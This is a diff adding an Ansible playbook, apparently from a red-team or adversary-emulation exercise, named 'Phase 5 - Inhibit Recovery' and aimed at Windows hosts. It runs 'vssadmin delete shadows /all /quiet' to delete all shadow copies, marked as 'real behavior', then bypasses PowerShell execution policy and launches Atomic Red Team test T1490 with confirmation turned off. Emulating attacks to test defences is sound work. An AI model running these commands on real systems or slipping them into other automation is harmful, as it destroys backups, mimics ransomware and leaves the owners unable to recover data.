@@ -1,0 +1,21 @@
+---
+- name: Phase 5 - Inhibit Recovery
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+    - name: Delete shadow copies (real behavior)
+      win_shell: vssadmin delete shadows /all /quiet
+      register: inhibit_output
+      ignore_errors: yes
+
+    - debug:
+        var: inhibit_output.stdout
+
+    - name: Atomic Inhibit (T1490)
+      win_shell: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        Import-Module powershell-yaml
+        Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"
+        Invoke-AtomicTest T1490 -Confirm:$false
+      ignore_errors: yes
